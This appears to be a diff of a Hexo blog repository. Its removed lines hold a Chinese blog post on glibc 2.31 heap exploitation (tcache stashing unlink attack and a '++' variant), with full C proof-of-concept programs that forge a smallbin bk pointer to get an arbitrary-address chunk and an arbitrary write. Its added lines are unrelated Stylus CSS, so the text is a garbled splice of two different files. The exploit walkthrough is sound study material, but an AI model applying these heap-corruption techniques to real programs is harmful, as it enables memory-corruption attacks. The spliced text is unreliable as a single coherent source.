class="number">0x18</span>) = (<span class="keyword">uint64_t</span>)(&amp;victim)<span class="number">-0x10</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n6. use calloc to apply to smallbin[4], it will trigger stash mechanism in smallbin.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">0x50</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now, the tcache_entry[4] list is %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p\n&quot;</span>, </span><br><span class="line">		&amp;victim, s2+<span class="number">0x3d0</span>, t1, t1<span class="number">-0x60</span>, t1<span class="number">-0x60</span>*<span class="number">2</span>, t1<span class="number">-0x60</span>*<span class="number">3</span>, t1<span class="number">-0x60</span>*<span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Apply to tcache_entry[4], you can get a pointer to victim address\n&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">uint64_t</span> *r = (<span class="keyword">uint64_t</span>*)<span class="built_in">malloc</span>(<span class="number">0x50</span>);</span><br><span class="line">	r[<span class="number">0</span>] = <span class="number">0xaa</span>;</span><br><span class="line">	r[<span class="number">1</span>] = <span class="number">0xbb</span>;</span><br><span class="line">	r[<span class="number">2</span>] = <span class="number">0xcc</span>;</span><br><span class="line">	r[<span class="number">3</span>] = <span class="number">0xdd</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;victim&#x27;s vaule: [0x%lx, 0x%lx, 0x%lx, 0x%lx]\n&quot;</span>, </span><br><span class="line">		victim[<span class="number">0</span>], victim[<span class="number">1</span>], victim[<span class="number">2</span>], victim[<span class="number">3</span>]);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;	</span><br></pre></td></tr></table></figure>
-
-<p>首先，这里直放入了五个chunk到tcache</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)&#123;</span><br><span class="line">    t1 = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">0x50</span>);</span><br><span class="line">    <span class="built_in">free</span>(t1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>然后后面是类似的放入两个chunk到smallbin，然后改变bk指针到我们的fake chunk，最后calloc我们的s1即可实现</p>
-<p><strong>需要注意的是，这里<code>victim[1] = (uint64_t)(&amp;victim);</code>是需要将fake_chunk的bk指针指向任意可写地址！</strong></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/image-20220224171340793.png"
-                      alt="image-20220224171340793"
-                ></p>
-<p>这个时候我们的利用危害性相对来说就比较大了，但是我们可以结合起来第一个漏洞来一起使用，也就是同时修改指定地址的值，并且在另一个地方创建fake chunk</p>
-<h2 id="tcache-stashing-unlink-attack-1"><a href="#tcache-stashing-unlink-attack-1" class="headerlink" title="tcache stashing unlink attack++"></a>tcache stashing unlink attack++</h2><p>其实利用方式也很简单，就是我们修改fake chunk的bk指针就行，这里就不细说，把poc贴出来就行了(要恰饭了)</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint64_t</span> victim[<span class="number">4</span>] = &#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint64_t</span> victim2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span>&#123;</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">	setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span> *t1;</span><br><span class="line">	<span class="keyword">char</span> *s1, *s2, *pad;</span><br><span class="line">	<span class="keyword">char</span> *tmp;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;You can use this technique to get a tcache chunk to arbitrary address, at the same time, write a big number to arbitrary address\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n1. need to know heap address, the victim address that you need to get chunk pointer and the victim address that you need to write a big number\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	tmp = <span class="built_in">malloc</span>(<span class="number">0x1</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;victim&#x27;s address: %p, victim&#x27;s vaule: [0x%lx, 0x%lx, 0x%lx, 0x%lx]\n&quot;</span>, </span><br><span class="line">		&amp;victim, victim[<span class="number">0</span>], victim[<span class="number">1</span>], victim[<span class="number">2</span>], victim[<span class="number">3</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;victim2&#x27;s address: %p, victim2&#x27;s value: 0x%lx\n&quot;</span>,</span><br><span class="line">		&amp;victim2, victim2);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;heap address: %p\n&quot;</span>, tmp<span class="number">-0x260</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n2. change victim&#x27;s data, make victim[1] = &amp;victim2-0x10\n&quot;</span>);</span><br><span class="line">	victim[<span class="number">1</span>] = (<span class="keyword">uint64_t</span>)(&amp;victim2)<span class="number">-0x10</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;victim&#x27;s vaule: [0x%lx, 0x%lx, 0x%lx, 0x%lx]\n&quot;</span>, </span><br><span class="line">		victim[<span class="number">0</span>], victim[<span class="number">1</span>], victim[<span class="number">2</span>], victim[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n3. choose a stable size and free five identical size chunks to tcache_entry list\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Here, I choose the size 0x60\n&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)&#123;</span><br><span class="line">		t1 = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">0x50</span>);</span><br><span class="line">		<span class="built_in">free</span>(t1);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now, the tcache_entry[4] list is %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p\n&quot;</span>, </span><br><span class="line">		t1, t1<span class="number">-0x60</span>, t1<span class="number">-0x60</span>*<span class="number">2</span>, t1<span class="number">-0x60</span>*<span class="number">3</span>, t1<span class="number">-0x60</span>*<span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n4. free two chunk with the same size like tcache_entry into the corresponding smallbin\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	s1 = <span class="built_in">malloc</span>(<span class="number">0x420</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Alloc a chunk %p, whose size is beyond tcache size threshold\n&quot;</span>, s1);</span><br><span class="line">	pad = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Alloc a padding chunk, avoid %p to merge to top chunk\n&quot;</span>, s1);</span><br><span class="line">	<span class="built_in">free</span>(s1);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Free chunk %p to unsortedbin\n&quot;</span>, s1);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x3c0</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Alloc a calculated size, make the rest chunk size in unsortedbin is 0x60\n&quot;</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Alloc a chunk whose size is larger than rest chunk size in unsortedbin, that will trigger chunk to other bins like smallbins\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;chunk %p is in smallbin[4], whose size is 0x60\n&quot;</span>, s1+<span class="number">0x3c0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Repeat the above steps, and free another chunk into corresponding smallbin\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;A little difference, notice the twice pad chunk size must be larger than 0x60, or you will destroy first chunk in smallbin[4]\n&quot;</span>);</span><br><span class="line">	s2 = <span class="built_in">malloc</span>(<span class="number">0x420</span>);</span><br><span class="line">	pad = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">	<span class="built_in">free</span>(s2);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x3c0</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;chunk %p is in smallbin[4], whose size is 0x60\n&quot;</span>, s2+<span class="number">0x3c0</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;smallbin[4] list is %p &lt;--&gt; %p\n&quot;</span>, s2+<span class="number">0x3c0</span>, s1+<span class="number">0x3c0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n5. overwrite the first chunk in smallbin[4]&#x27;s bk pointer to &amp;victim-0x10 address, the first chunk is smallbin[4]-&gt;fd\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Change %p&#x27;s bk pointer to &amp;victim-0x10 address: 0x%lx\n&quot;</span>, s2+<span class="number">0x3c0</span>, (<span class="keyword">uint64_t</span>)(&amp;victim)<span class="number">-0x10</span>);</span><br><span class="line">	*(<span class="keyword">uint64_t</span>*)((s2+<span class="number">0x3c0</span>)+<span class="number">0x18</span>) = (<span class="keyword">uint64_t</span>)(&amp;victim)<span class="number">-0x10</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n6. use calloc to apply to smallbin[4], it will trigger stash mechanism in smallbin.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">0x50</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now, the tcache_entry[4] list is %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p\n&quot;</span>, </span><br><span class="line">		&amp;victim, s2+<span class="number">0x3d0</span>, t1, t1<span class="number">-0x60</span>, t1<span class="number">-0x60</span>*<span class="number">2</span>, t1<span class="number">-0x60</span>*<span class="number">3</span>, t1<span class="number">-0x60</span>*<span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Apply to tcache_entry[4], you can get a pointer to victim address\n&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">uint64_t</span> *r = (<span class="keyword">uint64_t</span>*)<span class="built_in">malloc</span>(<span class="number">0x50</span>);</span><br><span class="line">	r[<span class="number">0</span>] = <span class="number">0xaa</span>;</span><br><span class="line">	r[<span class="number">1</span>] = <span class="number">0xbb</span>;</span><br><span class="line">	r[<span class="number">2</span>] = <span class="number">0xcc</span>;</span><br><span class="line">	r[<span class="number">3</span>] = <span class="number">0xdd</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;victim&#x27;s vaule: [0x%lx, 0x%lx, 0x%lx, 0x%lx]\n&quot;</span>, </span><br><span class="line">		victim[<span class="number">0</span>], victim[<span class="number">1</span>], victim[<span class="number">2</span>], victim[<span class="number">3</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;victim2&#x27;s value: 0x%lx\n&quot;</span>,</span><br><span class="line">		victim2);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;	</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a class="link"   target="_blank" rel="noopener" href="https://github.com/StarCross-Tech/heap_exploit_2.31" >https://github.com/StarCross-Tech/heap_exploit_2.31<i class="fas fa-external-link-alt"></i></a></p>
-
-        </div>
-
-        
-
-        
-            <div class="article-nav">
-                
-                    <div class="article-prev">
-                        <a class="prev"
-                           rel="prev"
-                           href="/2022/03/01/house-of-pig/"
-                        >
-                            <span class="left arrow-icon flex-center">
-                              <i class="fas fa-chevron-left"></i>
-                            </span>
-                            <span class="title flex-center">
-                                <span class="post-nav-title-item">house of pig</span>
-                                <span class="post-nav-item">上一篇</span>
-                            </span>
-                        </a>
-                    </div>
-                
-                
-                    <div class="article-next">
-                        <a class="next"
-                           rel="next"
-                           href="/2022/02/23/largebin-attack/"
-                        >
-                            <span class="title flex-center">
-                                <span class="post-nav-title-item">largebin attack</span>
-                                <span class="post-nav-item">下一篇</span>
-                            </span>
-                            <span class="right arrow-icon flex-center">
-                              <i class="fas fa-chevron-right"></i>
-                            </span>
-                        </a>
-                    </div>
-                
-            </div>
-        
-
-        
-            <div class="comment-container">
-                <div class="comments-container">
-    <div id="comment-anchor"></div>
-    <div class="comment-area-title">
-        <i class="fas fa-comments">&nbsp;评论</i>
-    </div>
-    
-
-        
-            
-    <div class="valine-container">
-        <script 
-                src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
-        <div id="vcomments"></div>
-        <script >
-            function loadValine() {
-                new Valine({
-                    el: '#vcomments',
-                    appId: 'OcvtJuJHDrSFIyDGdp3rLMtA-gzGzoHsz',
-                    appKey: 'C672AAYGXMkHxztf8ntdLShs',
-                    meta: ['nick', 'mail', 'link'],
-                    avatar: 'wavatar',
-                    enableQQ: true,
-                    placeholder: '😜若有问题请各位大师傅留言评论',
-                    lang: 'zh-CN'.toLowerCase()
-                });
-
-                function getAuthor(language) {
-                    switch (language) {
-                        case 'en':
-                            return 'Author';
-                        case 'zh-CN':
-                            return '博主';
-                        default:
-                            return 'Master';
-                    }
-                }
-
-                // Add "Author" identify
-                const getValineDomTimer = setInterval(() => {
-                    const vcards = document.querySelectorAll('#vcomments .vcards .vcard');
-                    if (vcards.length > 0) {
-                        let author = '196082';
-
-                        if (author) {
-                            for (let vcard of vcards) {
-                                const vnick_dom = vcard.querySelector('.vhead .vnick');
-                                const vnick = vnick_dom.innerHTML;
-                                if (vnick === author) {
-                                    vnick_dom.innerHTML = `${vnick} <span class="author">${getAuthor(KEEP.hexo_config.language)}</span>`
-                                }
-                            }
-                        }
-                        clearInterval(getValineDomTimer);
-                    } else {
-                        clearInterval(getValineDomTimer);
-                    }
-                }, 2000);
-            }
-
-            if ('false') {
-                const loadValineTimeout = setTimeout(() => {
-                    loadValine();
-                    clearTimeout(loadValineTimeout);
-                }, 1000);
-            } else {
-                window.addEventListener('DOMContentLoaded', loadValine);
-            }
-        </script>
-    </div>
+    +keep-mobile() {
+      font-size: $article-title-font-size * 0.8;
+    }
+  }
 
 
+  .article-header {
+    position: relative;
+    padding-left: $avatarWidth;
+    width: 100%;
+    height: $avatarWidth;
+    box-sizing: border-box;
 
-        
-    
-</div>
+    .avatar {
+      position: absolute;
+      top: 0
+      left: 0;
+      width: $avatarWidth;
+      height: $avatarWidth;
+      padding: 1px;
+      box-sizing: border-box;
+      border: 1px solid var(--border-color);
+      border-radius: 50%;
 
-            </div>
-        
-    </div>
-</div>
+      img {
+        border-radius: 50%;
+        width: 100%;
+        height: 100%;
+        background: var(--avatar-background-color);
+      }
+
+    }
+
+
+    .info {
+      padding: 2px 0;
+      margin-left: 10px;
+      box-sizing: border-box;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      width: 100%;
+      height: 100%;
+
+      .author {
+        font-weight: 600;
+        font-size: 1.18rem;
+        display: flex;
+        align-items: center;
+
+        .name {
+          color: var(--default-text-color);
+        }
+
+        .author-label {
+          margin-left: 10px;
+          font-size: 0.8rem;
+          font-weight: 500;
+          padding: 0 5px;
+          border-radius: 5px;
+          color: #fff;
+          background: var(--selection-color);
+        }
+
+      }
+    }
+
+  }
+
+
+  .article-header, .article-header-meta-info {
+    margin-top: 16px;
+    +keep-tablet() {
+      transform: scale(0.9);
+      transform-origin: left top;
+    }
+  }
+
+
+  .article-content {
+    margin-top: $component-spacing-value;
+    padding-bottom: 10px;
+    word-wrap: break-word;
+    border-bottom: 1px solid var(--border-color);
+    color: var(--default-text-color);
+  }
+
+  .post-copyright-info {
+    margin-top: $component-spacing-value;
+    width: 100%;
+  }
+
+  .article-nav {
+    height: 40px;
+    margin-top: $component-spacing-value;
+
+    .article-prev, .article-next {
+      max-width: $post-nav-max-width;
+      height: 100%;
+      box-sizing: border-box;
+
+      keep-container(true, 1.03, 1.03, 10px, 0);
+
+      a {
+        position: relative;
+        display: block;
+        width: 100%;
+        height: 100%;
+        box-sizing: border-box;
+
+        &.prev {
+          padding-left: $arrow-icon-width;
+        }
+
+        &.next {
+          padding-right: $arrow-icon-width;
+        }
+
+        .arrow-icon {
+          position: absolute;
+          top: 0;
+          height: 100%;
+          width: $arrow-icon-width;
+
+          &.left {
+            left: 0;
+          }
+
+          &.right {
+            right: 0;
+          }
+        }
+
+        .title {
+          width: 100%;
+          height: 100%;
+        }
+      }
+
+    }
+
+    .article-prev {
+      float: left;
+    }
+
+    .article-next {
+      float: right;
+    }
+
+    .post-nav-item {
+      display: none;
+
+      +keep-tablet() {
+        display: inline-block;
+      }
+
+    }
+
+
+    .post-nav-title-item {
+      overflow: hidden;
+      text-overflow: ellipsis;
+      white-space: nowrap;
+
+      +keep-tablet() {
+        display: none;
+      }
+    }
+
+  }
+
+
+}
+
 
 
                 
